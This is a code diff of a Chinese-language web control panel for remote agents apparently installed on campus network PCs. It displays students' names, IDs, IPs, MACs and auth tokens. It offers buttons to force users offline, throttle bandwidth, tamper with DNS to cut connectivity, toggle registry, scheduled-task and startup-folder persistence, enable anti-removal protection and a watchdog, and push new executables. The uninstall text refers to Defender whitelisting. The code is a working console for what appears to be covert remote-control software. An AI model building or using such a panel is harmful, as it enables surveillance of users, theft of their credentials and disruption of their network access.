+      <button class="btn btn-red" onclick="forceOffline('${id}','${hn}')">⏏ 强制下线</button>
+      <button class="btn btn-green" onclick="sendCmd('${id}','unlock')">🔓 解除锁定</button>
+      <button class="btn btn-blue" onclick="sendCmd('${id}','refresh')">🔄 刷新状态</button>
+      <button class="btn btn-orange" onclick="sendCmd('${id}','cancel_mab')">🚫 取消无感</button>
+    </div></div>
+    <div class="action-group"><div class="group-title">⚡ 限速 &amp; DNS</div><div class="action-row">
+      <button class="btn ${a.bandwidth_limit?'btn-red':'btn-orange'}" onclick="setBandwidth('${id}','${hn}',${a.bandwidth_limit||0})">${a.bandwidth_limit?'🔻 修改限速':'⚡ 设置限速'}</button>
+      ${a.bandwidth_limit?`<button class="btn btn-green" onclick="sendCmd('${id}','clear_bandwidth')">🚀 解除限速</button>`:''}
+      <button class="btn ${a.dns_hijacked?'btn-red':'btn-blue'}" onclick="setDns('${id}','${hn}')">${a.dns_hijacked?'🌐 改DNS':'🌐 篡改DNS'}</button>
+      ${a.dns_hijacked?`<button class="btn btn-green" onclick="sendCmd('${id}','reset_dns')">🔄 恢复DNS</button>`:''}
+    </div></div>
+    <div class="action-group"><div class="group-title">🛡️ 系统 &amp; 防护</div>
+      <div class="autostart-toggle"><div><div class="label">🚀 开机自启动</div><div class="hint">${a.autostart_reg?"注册表✓":"注册表✗"} · ${a.autostart_task?"计划任务✓":"计划任务✗"} · ${a.autostart_lnk?"启动夹✓":"启动夹✗"}</div></div>
+        <label class="toggle" onclick="toggleAutostart('${id}','${hn}',${!!a.autostart})"><input type="checkbox" ${a.autostart?"checked":""} onclick="event.preventDefault()"><span class="slider"></span></label>
+      </div>
+      <div class="action-row" style="margin-top:8px">
+        <button class="btn btn-green" onclick="sendCmd('${id}','protect')">🛡️ 启用防护</button>
+        <button class="btn btn-red" onclick="sendCmd('${id}','unprotect')">🔓 解除防护</button>
+        <button class="btn btn-purple" onclick="sendCmd('${id}','start_watchdog')">👁️ 看门狗</button>
+      </div>
+    </div>
+    <div class="action-group"><div class="group-title">📦 生命周期 &amp; 更新</div><div class="action-row">
+      <button class="btn btn-blue" onclick="pushUpdateSingle('${id}','${hn}','${esc(a.version||'')}')">📦 推送更新</button>
+      <button class="btn btn-red" onclick="confirmUninstall('${id}','${hn}')">🗑️ 完全卸载</button>
+      <button class="btn btn-dark" onclick="deleteAgent('${id}','${hn}')">❌ 删除设备</button>
+    </div></div>
+    <div class="token-section"><div class="label">🔑 USER TOKEN (userIndex)</div><div class="val">${esc(a.user_index||'无 token')}</div></div>`;
 }
 
-let pendingAction=null;
-function toggleAutostart(agentId, hostname, currentState){
-  const action=currentState?"disable_autostart":"enable_autostart";
-  const actionText=currentState?"禁用开机自启":"启用开机自启";
-  pendingAction={agentId,action};
-  document.getElementById("modalTitle").textContent=actionText;
-  document.getElementById("modalMsg").innerHTML=
-    `设备: <b>${hostname}</b><br>` +
-    `操作: <b>${actionText}</b><br><br>` +
-    `这将${currentState?"删除该设备的开机自动运行配置":"在该设备上设置开机后自动启动 Agent"}`;
-  document.getElementById("confirmModal").className="modal-overlay show";
+async function sendCmd(agentId,cmd,params={}){
+  addLog('下发: '+cmd+' → '+agentId.substring(0,8));
+  try{const r=await fetch(API+"/api/command",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({agent_id:agentId,command:cmd,params})});const j=await r.json();if(j.ok)addLog('命令已发送 ('+j.cmd_id+')','ok');else addLog('发送失败: '+j.error,'err');}catch(e){addLog('网络错误: '+e,'err');}
 }
-function closeModal(){
-  document.getElementById("confirmModal").className="modal-overlay";
-  pendingAction=null;
+function closeModal(){document.getElementById("confirmModal").classList.remove("show");pendingAction=null;}
+function openModal(title,msgHtml){document.getElementById("modalTitle").textContent=title;document.getElementById("modalMsg").innerHTML=msgHtml;document.getElementById("confirmModal").classList.add("show");}
+function toggleAutostart(agentId,hostname,cur){
+  pendingAction={agentId,action:cur?"disable_autostart":"enable_autostart"};
+  openModal(cur?"禁用开机自启":"启用开机自启",'设备: <b>'+esc(hostname)+'</b><br><br>'+(cur?'将删除该设备的开机自动运行配置':'将在该设备上设置开机后自动启动 Agent'));
 }
 function forceOffline(agentId,hostname){
   pendingAction={agentId,action:'logout'};
-  document.getElementById("modalTitle").textContent="强制下线";
-  document.getElementById("modalMsg").innerHTML=
-    `设备: <b>${hostname}</b><br><br>`+
-    `<label style="font-size:13px">离线持续时间:</label><br>`+
-    `<select id="offlineDuration" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:100%">`+
-    `<option value="0">永久 (手动解锁)</option>`+
-    `<option value="15">15秒</option>`+
-    `<option value="30">30秒</option>`+
-    `<option value="60">1分钟</option>`+
-    `<option value="300" selected>5分钟</option>`+
-    `<option value="600">10分钟</option>`+
-    `<option value="1800">30分钟</option>`+
-    `<option value="3600">1小时</option>`+
-    `<option value="7200">2小时</option>`+
-    `<option value="86400">24小时</option>`+
-    `</select>`;
-  document.getElementById("confirmModal").className="modal-overlay show";
+  openModal('⏏ 强制下线','设备: <b>'+esc(hostname)+'</b><br><br><label class="mdl-label">离线持续时间:</label><select id="offlineDuration" class="mdl-select"><option value="0">永久 (手动解锁)</option><option value="15">15秒</option><option value="30">30秒</option><option value="60">1分钟</option><option value="300" selected>5分钟</option><option value="600">10分钟</option><option value="1800">30分钟</option><option value="3600">1小时</option><option value="7200">2小时</option><option value="86400">24小时</option></select>');
 }
-async function confirmAction(){
-  if(!pendingAction)return;
-  const{agentId,action}=pendingAction;
-  let params={};
-  if(action==='logout'){
-    const sel=document.getElementById("offlineDuration");
-    if(sel)params.duration=parseInt(sel.value);
-  } else if(action==='set_bandwidth'){
-    const sel=document.getElementById("bwRate");
-    if(sel)params.rate_kbps=parseInt(sel.value);
-  } else if(action==='set_dns'){
-    const sel=document.getElementById("dnsSelect");
-    if(sel){
-      if(sel.value==='custom'){
-        const inp=document.getElementById("dnsCustom");
-        params.primary=inp?inp.value.trim():'127.0.0.1';
-      } else {
-        params.primary=sel.value;
-      }
-    }
-  }
-  // 读取 modal 数据 (在 closeModal 之前)
-  let _pushVer='',_pushUrl='',_blockCheck=true;
-  if(action==='__push_update__'){
-    _pushVer=document.getElementById('updateVer')?.value?.trim()||'';
-    _pushUrl=document.getElementById('updateUrl')?.value?.trim()||'';
-  }
-  if(action==='__delete__') _blockCheck=document.getElementById('blockCheck')?.checked??true;
-  closeModal();
-  if(action==='__delete__'){
-    await doDelete(agentId,_blockCheck);
-  } else if(action==='__push_update__'){
-    const ver=_pushVer;
-    const url=_pushUrl;
-    let params2={version:ver};
-    if(url)params2.url=url;
-    try{
-      const r=await fetch(API+'/api/push_update',{method:'POST',headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({agents:[agentId],version:ver,url:url||undefined})});
-      const j=await r.json();
-      if(j.ok)addLog(`已推送更新 v${ver} → ${agentId.substring(0,8)}...`,'ok');
-      else addLog(`推送失败: ${j.error}`,'err');
-    }catch(e){addLog(`推送错误: ${e}`,'err');}
-  } else {
-    await sendCmd(agentId,action,params);
-  }
-}
-
-function confirmUninstall(agentId,hostname){
-  pendingAction={agentId,action:'uninstall'};
-  document.getElementById("modalTitle").textContent="⚠️ 完全卸载";
-  document.getElementById("modalMsg").innerHTML=
-    `设备: <b>${hostname}</b><br><br>`+
-    `<span style="color:#dc2626;font-weight:600">此操作将完全移除该设备上的 Agent：</span><br>`+
-    `• 删除所有自启动项 (注册表+计划任务+启动夹)<br>`+
-    `• 解除文件防护和 Defender 白名单<br>`+
-    `• 删除配置文件<br>`+
-    `• 停止看门狗和 Agent 进程<br><br>`+
-    `<b style="color:#dc2626">卸载后无法远程恢复，需到现场重新安装！</b>`;
-  document.getElementById("confirmModal").className="modal-overlay show";
-}
-
-function deleteAgent(agentId,hostname){
-  pendingAction={agentId,action:'__delete__'};
-  document.getElementById("modalTitle").textContent="删除设备";
-  document.getElementById("modalMsg").innerHTML=
-    `设备: <b>${hostname}</b><br><br>`+
-    `<label><input type="checkbox" id="blockCheck" checked> 同时拉黑（禁止重新连接）</label>`;
-  document.getElementById("confirmModal").className="modal-overlay show";
-}
-async function doDelete(agentId,block){
-  addLog(`删除设备: ${agentId.substring(0,8)}... ${block?"+拉黑":""}`);
-  try{
-    const r=await fetch(API+"/api/delete_agent",{method:"POST",headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({agent_id:agentId,block})});
-    const j=await r.json();
-    if(j.ok){addLog("删除成功","ok");refresh();}
-    else addLog(`删除失败: ${j.error}`,"err");
-  }catch(e){addLog(`网络错误: ${e}`,"err")}
-}
-
 function setBandwidth(agentId,hostname,current){
   pendingAction={agentId,action:'set_bandwidth'};
-  document.getElementById("modalTitle").textContent="⚡ 设置限速";
-  document.getElementById("modalMsg").innerHTML=
-    `设备: <b>${hostname}</b><br>`+
-    `当前: <b>${current?current+'KB/s':'无限制'}</b><br><br>`+
-    `<label style="font-size:13px">限速值 (KB/s):</label><br>`+
-    `<select id="bwRate" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:100%">`+
-    `<option value="10">10 KB/s (极慢)</option>`+
-    `<option value="50">50 KB/s</option>`+
-    `<option value="100" selected>100 KB/s</option>`+
-    `<option value="200">200 KB/s</option>`+
-    `<option value="500">500 KB/s</option>`+
-    `<option value="1024">1 MB/s</option>`+
-    `<option value="2048">2 MB/s</option>`+
-    `<option value="5120">5 MB/s</option>`+
-    `</select>`;
-  document.getElementById("confirmModal").className="modal-overlay show";
+  openModal('⚡ 设置限速','设备: <b>'+esc(hostname)+'</b><br>当前: <b>'+(current?current+' KB/s':'无限制')+'</b><br><br><label class="mdl-label">限速值:</label><select id="bwRate" class="mdl-select"><option value="10">10 KB/s (极慢)</option><option value="50">50 KB/s</option><option value="100" selected>100 KB/s</option><option value="200">200 KB/s</option><option value="500">500 KB/s</option><option value="1024">1 MB/s</option><option value="2048">2 MB/s</option><option value="5120">5 MB/s</option></select>');
 }
-
 function setDns(agentId,hostname){
   pendingAction={agentId,action:'set_dns'};
-  document.getElementById("modalTitle").textContent="🌐 篡改 DNS";
-  document.getElementById("modalMsg").innerHTML=
-    `设备: <b>${hostname}</b><br><br>`+
-    `<label style="font-size:13px">主 DNS:</label><br>`+
-    `<select id="dnsSelect" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:100%">`+
-    `<option value="127.0.0.1">127.0.0.1 (本地回环, 几乎断网)</option>`+
-    `<option value="0.0.0.0">0.0.0.0 (无效, 断网)</option>`+
-    `<option value="1.1.1.1">1.1.1.1 (Cloudflare, 正常)</option>`+
-    `<option value="8.8.8.8">8.8.8.8 (Google, 正常)</option>`+
-    `<option value="114.114.114.114">114.114.114.114 (国内公共, 正常)</option>`+
-    `<option value="custom">自定义...</option>`+
-    `</select>`+
-    `<input id="dnsCustom" type="text" placeholder="输入自定义DNS IP" style="display:none;margin-top:6px;padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;width:calc(100% - 26px)">`;
-  document.getElementById("confirmModal").className="modal-overlay show";
-  setTimeout(()=>{
-    const sel=document.getElementById('dnsSelect');
-    const inp=document.getElementById('dnsCustom');
-    if(sel&&inp){sel.onchange=()=>{inp.style.display=sel.value==='custom'?'block':'none';};}
-  },50);
+  openModal('🌐 篡改 DNS','设备: <b>'+esc(hostname)+'</b><br><br><label class="mdl-label">主 DNS:</label><select id="dnsSelect" class="mdl-select"><option value="127.0.0.1">127.0.0.1 (回环, 断网)</option><option value="0.0.0.0">0.0.0.0 (无效)</option><option value="1.1.1.1">1.1.1.1 (Cloudflare)</option><option value="8.8.8.8">8.8.8.8 (Google)</option><option value="114.114.114.114">114.114.114.114 (国内)</option><option value="custom">自定义...</option></select><input id="dnsCustom" type="text" placeholder="输入自定义DNS" class="mdl-input" style="display:none">');
+  setTimeout(()=>{const s=document.getElementById('dnsSelect'),i=document.getElementById('dnsCustom');if(s&&i)s.onchange=()=>{i.style.display=s.value==='custom'?'block':'none';};},50);
 }
-
-async function uploadAndPushAll(){
-  const input=document.createElement('input');
-  input.type='file';
-  input.accept='.exe';
-  input.onchange=async()=>{
-    const file=input.files[0];
-    if(!file)return;
-    const ver=prompt('新版本号 (如 1.5):','');
-    if(ver===null)return;
-    addLog(`上传中: ${file.name} (${(file.size/1024/1024).toFixed(1)}MB)...`);
-    const fd=new FormData();
-    fd.append('file',file);
-    try{
-      const r=await fetch(API+'/api/upload_exe',{method:'POST',body:fd});
-      const j=await r.json();
-      if(!j.ok){addLog(`上传失败: ${j.error}`,'err');return;}
-      addLog(`上传成功: ${j.size_mb}MB`,'ok');
-      if(confirm(`上传成功! 是否推送更新 v${ver} 到所有在线 Agent?`)){
-        const r2=await fetch(API+'/api/push_update',{method:'POST',headers:{'Content-Type':'application/json'},
-          body:JSON.stringify({version:ver})});
-        const j2=await r2.json();
-        if(j2.ok)addLog(`已推送到 ${j2.count} 个Agent`,'ok');
-        else addLog(`推送失败: ${j2.error}`,'err');
-      }
-    }catch(e){addLog(`上传错误: ${e}`,'err');}
-  };
-  input.click();
+function confirmUninstall(agentId,hostname){
+  pendingAction={agentId,action:'uninstall'};
+  openModal('⚠️ 完全卸载','设备: <b>'+esc(hostname)+'</b><br><br>此操作将终止进程、删除文件和注册表项。<br><br><b style="color:var(--red-text)">卸载后无法远程恢复，需现场重装！</b>');
 }
-
-function pushUpdateSingle(agentId,hostname,currentVer){
+function deleteAgent(agentId,hostname){
+  pendingAction={agentId,action:'__delete__'};
+  openModal('❌ 删除设备','设备: <b>'+esc(hostname)+'</b><br><br><label style="display:flex;align-items:center;gap:6px"><input type="checkbox" id="blockCheck" checked> 同时拉黑（禁止重连）</label>');
+}
+function pushUpdateSingle(agentId,hostname,curVer){
   pendingAction={agentId,action:'__push_update__'};
-  document.getElementById("modalTitle").textContent="📦 推送更新";
-  document.getElementById("modalMsg").innerHTML=
-    `设备: <b>${hostname}</b><br>`+
-    `当前版本: <b>v${currentVer||'?'}</b><br><br>`+
-    `<label style="font-size:13px">新版本号:</label><br>`+
-    `<input id="updateVer" type="text" placeholder="如 1.5" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:calc(100% - 26px)">`+
-    `<br><br><span style="font-size:12px;color:#9ca3af">需先上传新版本 exe (通过顶部 📦 按钮), 或输入自定义下载URL:</span><br>`+
-    `<input id="updateUrl" type="text" placeholder="留空则使用服务器托管的exe" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:calc(100% - 26px)">`;
-  document.getElementById("confirmModal").className="modal-overlay show";
+  openModal('📦 推送更新','设备: <b>'+esc(hostname)+'</b><br>当前: <b>v'+(curVer||'?')+'</b><br><br><label class="mdl-label">新版本号:</label><input id="updateVer" type="text" placeholder="如 1.6" class="mdl-input"><br><label class="mdl-label" style="display:block;margin-top:10px">自定义URL (可选):</label><input id="updateUrl" type="text" placeholder="留空用服务器托管exe" class="mdl-input">');
+}
+async function confirmAction(){
+  if(!pendingAction){closeModal();return;}
+  const{agentId,action}=pendingAction;let params={};
+  if(action==='logout'){const s=document.getElementById("offlineDuration");if(s)params.duration=parseInt(s.value);}
+  else if(action==='set_bandwidth'){const s=document.getElementById("bwRate");if(s)params.rate_kbps=parseInt(s.value);}
+  else if(action==='set_dns'){const s=document.getElementById("dnsSelect");if(s){if(s.value==='custom'){const i=document.getElementById("dnsCustom");params.primary=i?i.value.trim():'127.0.0.1';}else params.primary=s.value;}}
+  let _pv='',_pu='',_bc=true;
+  if(action==='__push_update__'){_pv=document.getElementById('updateVer')?.value?.trim()||'';_pu=document.getElementById('updateUrl')?.value?.trim()||'';}
+  if(action==='__delete__')_bc=document.getElementById('blockCheck')?.checked??true;
+  closeModal();
+  if(action==='__delete__'){await doDelete(agentId,_bc);}
+  else if(action==='__push_update__'){
+    try{const r=await fetch(API+'/api/push_update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agents:[agentId],version:_pv,url:_pu||undefined})});const j=await r.json();if(j.ok)addLog('推送更新 v'+_pv+' → '+agentId.substring(0,8),'ok');else addLog('推送失败: '+j.error,'err');}catch(e){addLog('推送错误: '+e,'err');}
+  }else{await sendCmd(agentId,action,params);}
+}
+async function doDelete(agentId,block){
+  addLog('删除: '+agentId.substring(0,8)+(block?' +拉黑':''));
+  try{const r=await fetch(API+"/api/delete_agent",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({agent_id:agentId,block})});const j=await r.json();if(j.ok){addLog("删除成功","ok");closeDrawer();refresh();}else addLog('删除失败: '+j.error,'err');}catch(e){addLog('网络错误: '+e,'err');}
+}
+async function uploadAndPushAll(){
+  const input=document.createElement('input');input.type='file';input.accept='.exe';
+  input.onchange=async()=>{const file=input.files[0];if(!file)return;const ver=prompt('新版本号:','');if(ver===null)return;addLog('上传: '+file.name);const fd=new FormData();fd.append('file',file);
+    try{const r=await fetch(API+'/api/upload_exe',{method:'POST',body:fd});const j=await r.json();if(!j.ok){addLog('上传失败: '+j.error,'err');return;}addLog('上传成功: '+j.size_mb+'MB','ok');
+      if(confirm('上传成功! 推送v'+ver+'到所有在线Agent?')){const r2=await fetch(API+'/api/push_update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({version:ver})});const j2=await r2.json();if(j2.ok)addLog('推送到'+j2.count+'个Agent','ok');else addLog('推送失败: '+j2.error,'err');}
+    }catch(e){addLog('上传错误: '+e,'err');}};input.click();
 }
 
-async function sendCmd(agentId, cmd, params={}){
-  addLog(`下发命令: ${cmd} → ${agentId.substring(0,8)}...`);
-  try{
-    const r=await fetch(API+"/api/command",{method:"POST",headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({agent_id:agentId,command:cmd,params})});
-    const j=await r.json();
-    if(j.ok)addLog(`命令已发送 (${j.cmd_id})`, "ok");
-    else addLog(`发送失败: ${j.error}`,"err");
-  }catch(e){addLog(`网络错误: ${e}`,"err")}
+function categorizeLog(h){const a=(h.action||"").toString();if(a.startsWith("下发命令"))return"cmd";if(a==="命令结果")return"result";if(a==="首次连接"||a==="重新上线"||a.startsWith("删除设备"))return"conn";return"sys";}
+function setLogTab(k){_logTab=k;document.querySelectorAll('.log-tabs .tab').forEach(t=>t.classList.toggle('active',t.dataset.kind===k));renderLogs();}
+function toggleLogFilterPanel(){const p=document.getElementById("logFilterPanel");p.style.display=p.style.display==="none"?"block":"none";if(p.style.display==="block")renderDeviceFilterList();}
+function renderDeviceFilterList(){
+  const list=document.getElementById("logFilterList");
+  list.innerHTML=_agents.map(a=>'<label class="filter-item"><input type="checkbox" '+(_logDeviceFilter.has(a.agent_id)?'checked':'')+' onchange="toggleDeviceFilter(\''+esc(a.agent_id)+'\',this.checked)"><span>'+esc(a.hostname||a.agent_id)+'</span></label>').join("");
 }
+function toggleDeviceFilter(aid,on){if(on)_logDeviceFilter.add(aid);else _logDeviceFilter.delete(aid);updateFilterBtn();renderLogs();}
+function selectAllDevices(all){_logDeviceFilter.clear();if(all)_agents.forEach(a=>_logDeviceFilter.add(a.agent_id));renderDeviceFilterList();updateFilterBtn();renderLogs();}
+function updateFilterBtn(){const b=document.getElementById("filterBtn");b.textContent=_logDeviceFilter.size?'🎯 已选 '+_logDeviceFilter.size+' 台设备':'🎯 按设备筛选: 全部';}
 
-function addLog(msg,type=""){
+function renderLogs(){
+  const kw=(document.getElementById("logSearch")?.value||"").trim().toLowerCase();
+  const all=[..._sessionLogs,..._history];
+  let list=all.filter(h=>{
+    if(_logTab!=="all"){if(h.agent_id==="session"){if(_logTab!=="sys")return false;}else if(categorizeLog(h)!==_logTab)return false;}
+    if(_logDeviceFilter.size&&h.agent_id!=="session"&&!_logDeviceFilter.has(h.agent_id))return false;
+    if(kw){const t=[h.hostname,h.action,h.detail,h.agent_id].map(x=>(x||"").toString().toLowerCase()).join("|");if(!t.includes(kw))return false;}
+    return true;
+  });
   const box=document.getElementById("logBox");
-  const t=new Date().toLocaleTimeString("zh-CN",{hour12:false});
-  box.innerHTML=`<div class="${type}">[${t}] ${msg}</div>`+box.innerHTML;
-  if(box.children.length>100)box.removeChild(box.lastChild);
+  if(!list.length){box.innerHTML='<div class="log-empty">无匹配日志</div>';return;}
+  box.innerHTML=list.slice(0,500).map(h=>{
+    const cls=h.success===true?"ok":h.success===false?"err":"";
+    const ic=h.success===true?"✓":h.success===false?"✗":"•";
+    return '<div class="log-row '+cls+'"><span class="ic">'+ic+'</span><span class="tm">'+fmtTime(h.time)+'</span><span class="host">'+esc(h.hostname||(h.agent_id==="session"?"面板":h.agent_id?.substring(0,10)))+'</span><span class="act">'+esc(h.action||'')+' <span class="detail">'+esc(h.detail||'')+'</span></span></div>';
+  }).join("");
 }
 
 async function refresh(){
   try{
-    const r=await fetch(API+"/api/agents");
-    const agents=await r.json();
-    const grid=document.getElementById("agentGrid");
-    
-    let online=0,offline=0,away=0;
-    agents.forEach(a=>{
-      if(a.alive && a.net_online)online++;
-      else if(a.alive)away++;
-      else offline++;
-    });
-    
-    document.getElementById("totalCnt").textContent=agents.length;
-    document.getElementById("onlineCnt").textContent=online;
-    document.getElementById("offlineCnt").textContent=offline;
-    document.getElementById("awayCnt").textContent=away;
-    
-    if(!agents.length){
-      grid.innerHTML='<div class="empty">暂无 Agent 连接，请在客户端启动 agent.py</div>';
-      grid._prevKey="";
-    } else {
-    const newHtml=agents.map(a=>{
-      const cls=a.status_cls||"off";
-      const stMap={"on":"online","off":"offline","aw":"away"};
-      return `
-      <div class="agent ${stMap[cls]||'offline'}" data-aid="${a.agent_id}">
-        <div class="agent-head">
-          <span class="agent-name">💻 ${a.hostname||a.agent_id}</span>
-          <span class="badge ${cls}">${a.status_text||"未知"}</span>
-        </div>
-        <div class="info-row"><span class="k">Agent ID</span><span class="v">${a.agent_id||"--"}</span></div>
-        <div class="info-row"><span class="k">👤 用户姓名</span><span class="v" style="color:#0891b2;font-weight:600">${a.username||"--"}</span></div>
-        <div class="info-row"><span class="k">🎓 学号</span><span class="v" style="color:#0891b2">${a.user_id||"--"}</span></div>
-        <div class="info-row"><span class="k">局域网 IP</span><span class="v">${a.local_ip||"--"}</span></div>
-        <div class="info-row"><span class="k">校园网 IP</span><span class="v">${a.user_ip||a.campus_ip||"--"}</span></div>
-        <div class="info-row"><span class="k">MAC</span><span class="v">${a.mac||"--"}</span></div>
-        <div class="info-row"><span class="k">网络状态</span><span class="v">${a.force_offline?"🔒 "+(a.net_message||"强制离线中"):a.net_online?"✅ 已认证":"❌ 未认证"}</span></div>
-        <div class="info-row"><span class="k">⚡ 限速</span><span class="v" style="color:${a.bandwidth_limit?'#dc2626':'#16a34a'}">${a.bandwidth_limit?'🔻 '+a.bandwidth_limit+'KB/s':'无限制'}</span></div>
-        <div class="info-row"><span class="k">🌐 DNS</span><span class="v" style="color:${a.dns_hijacked?'#dc2626':'#16a34a'}">${a.dns_hijacked?'⚠️ '+a.dns_servers:'自动(DHCP)'}</span></div>
-        <div class="info-row"><span class="k">最后心跳</span><span class="v">${ago(a.last_seen)}</span></div>
-        <div class="info-row"><span class="k">运行时间</span><span class="v">${a.uptime||"--"}</span></div>
-        <div class="info-row"><span class="k">📦 版本</span><span class="v">v${a.version||"?"}</span></div>
-        <div class="autostart-row">
-          <span class="label">🚀 开机自启 <span style="font-size:11px;color:#9ca3af;font-weight:400">${a.autostart_reg?"注册表✓":"注册表✗"} | ${a.autostart_task?"计划任务✓":"计划任务✗"} | ${a.autostart_lnk?"启动夹✓":"启动夹✗"}</span></span>
-          <label class="toggle" onclick="toggleAutostart('${a.agent_id}','${a.hostname||a.agent_id}',${!!a.autostart})">
-            <input type="checkbox" ${a.autostart?"checked":""} onclick="event.preventDefault()">
-            <span class="slider"></span>
-          </label>
-        </div>
-        <div class="actions">
-          <button class="btn btn-red" onclick="forceOffline('${a.agent_id}','${a.hostname||a.agent_id}')">⏏ 强制下线</button>
-          <button class="btn btn-green" onclick="sendCmd('${a.agent_id}','unlock')">🔓 解除锁定</button>
-          <button class="btn btn-blue" onclick="sendCmd('${a.agent_id}','refresh')">🔄 刷新</button>
-          <button class="btn btn-orange" onclick="sendCmd('${a.agent_id}','cancel_mab')">🚫 取消无感</button>
-          <button class="btn" style="background:#f1f5f9;color:#64748b" onclick="toggleToken('${a.agent_id}')">🔑 Token</button>
-        </div>
-        <div class="actions" style="margin-top:6px">
-          <button class="btn" style="background:${a.bandwidth_limit?'#fef2f2':'#f0fdf4'};color:${a.bandwidth_limit?'#b91c1c':'#166534'}" onclick="setBandwidth('${a.agent_id}','${a.hostname||a.agent_id}',${a.bandwidth_limit||0})">${a.bandwidth_limit?'🔻 改限速':'⚡ 限速'}</button>
-          ${a.bandwidth_limit?`<button class="btn btn-green" onclick="sendCmd('${a.agent_id}','clear_bandwidth')">🚀 解除限速</button>`:''}
-          <button class="btn" style="background:${a.dns_hijacked?'#fef2f2':'#eff6ff'};color:${a.dns_hijacked?'#b91c1c':'#1e40af'}" onclick="setDns('${a.agent_id}','${a.hostname||a.agent_id}')">${a.dns_hijacked?'🌐 改DNS':'🌐 篡改DNS'}</button>
-          ${a.dns_hijacked?`<button class="btn btn-green" onclick="sendCmd('${a.agent_id}','reset_dns')">🔄 恢复DNS</button>`:''}
-        </div>
-        <div class="actions" style="margin-top:6px">
-          <button class="btn btn-green" onclick="sendCmd('${a.agent_id}','protect')">🛡️ 启用防护</button>
-          <button class="btn" style="background:#fef2f2;color:#b91c1c" onclick="sendCmd('${a.agent_id}','unprotect')">🔓 解除防护</button>
-          <button class="btn" style="background:#ede9fe;color:#6d28d9" onclick="sendCmd('${a.agent_id}','start_watchdog')">👁️ 看门狗</button>
-          <button class="btn" style="background:#450a0a;color:#fca5a5" onclick="confirmUninstall('${a.agent_id}','${a.hostname||a.agent_id}')">🗑️ 卸载</button>
-          <button class="btn" style="background:#1f2937;color:#fff" onclick="deleteAgent('${a.agent_id}','${a.hostname||a.agent_id}')">❌ 删除</button>
-          <button class="btn" style="background:#dbeafe;color:#1d4ed8" onclick="pushUpdateSingle('${a.agent_id}','${a.hostname||a.agent_id}','${a.version||''}')">📦 推送更新</button>
-        </div>
-        <div class="token-box" id="tok-${a.agent_id}">${a.user_index||"无 token"}</div>
-      </div>`;
-    }).join("");
-    // 只在内容变化时更新DOM (排除心跳时间等动态字段避免闪烁)
-    const stableKey=agents.map(a=>`${a.agent_id}|${a.status_cls}|${a.net_online}|${a.force_offline}|${a.autostart}|${a.autostart_reg}|${a.autostart_task}|${a.autostart_lnk}|${a.username}|${a.user_id}|${a.user_ip}|${a.campus_ip}|${a.local_ip}|${a.bandwidth_limit||''}|${a.dns_hijacked||''}|${a.dns_servers||''}|${a.version||''}`).join(";");
-    if(stableKey!==grid._prevKey){grid.innerHTML=newHtml;grid._prevKey=stableKey;}
-    else{
-      // 只更新动态文本(心跳/运行时间)不重建DOM
-      agents.forEach(a=>{
-        const card=grid.querySelector(`[data-aid="${a.agent_id}"]`);
-        if(card){
-          const vs=card.querySelectorAll('.v');
-          vs.forEach(v=>{
-            if(v.previousElementSibling&&v.previousElementSibling.textContent==='最后心跳')v.textContent=ago(a.last_seen);
-            if(v.previousElementSibling&&v.previousElementSibling.textContent==='运行时间')v.textContent=a.uptime||'--';
-            if(v.previousElementSibling&&v.previousElementSibling.textContent==='网络状态')v.innerHTML=a.force_offline?'🔒 '+(a.net_message||'强制离线中'):a.net_online?'✅ 已认证':'❌ 未认证';
-          });
-        }
-      });
-    }
-    }
-    
-    // 拉取历史记录
-    const hr=await fetch(API+"/api/history?n=50");
-    const hist=await hr.json();
-    const hbox=document.getElementById("historyBox");
-    if(hist.length){
-      hbox.innerHTML=hist.map(h=>{
-        const t=new Date(h.time*1000).toLocaleString("zh-CN",{hour12:false});
-        const cls=h.success===true?"ok":h.success===false?"err":"";
-        const icon=h.success===true?"✅":h.success===false?"❌":"📌";
-        return `<div class="${cls}">${icon} [${t}] <b>${h.hostname||""}</b> ${h.action} ${h.detail?'<span style="color:#9ca3af">'+h.detail+'</span>':''}</div>`;
-      }).join("");
-    }
-    
-  }catch(e){console.error(e)}
+    const r=await fetch(API+"/api/agents");_agents=await r.json();
+    document.getElementById("totalCnt").textContent=_agents.length;
+    let on=0,off=0,aw=0;
+    _agents.forEach(a=>{if(a.status_cls==="on")on++;else if(a.status_cls==="aw")aw++;else off++;});
+    document.getElementById("onlineCnt").textContent=on;
+    document.getElementById("offlineCnt").textContent=off;
+    document.getElementById("awayCnt").textContent=aw;
+    renderAgents();
+    if(_currentAgentId)renderDrawer();
+  }catch(e){console.error("refresh fail",e);}
+  try{
+    const r2=await fetch(API+"/api/history");_history=await r2.json();
+    document.getElementById("histLogCount").textContent=_history.length;
+    renderLogs();
+  }catch(e){}
 }
 
 function updateClock(){
-  document.getElementById("clock").textContent=new Date().toLocaleString("zh-CN",{hour12:false});
+  const d=new Date();
+  document.getElementById("clock").textContent=d.toLocaleString("zh-CN",{hour12:false,year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"});
 }
 
-setInterval(refresh, 3000);
-setInterval(updateClock, 1000);
-refresh();
-updateClock();
+setInterval(refresh,4000);
+setInterval(updateClock,1000);
+refresh();updateClock();
 </script>
 </body>
 </html>
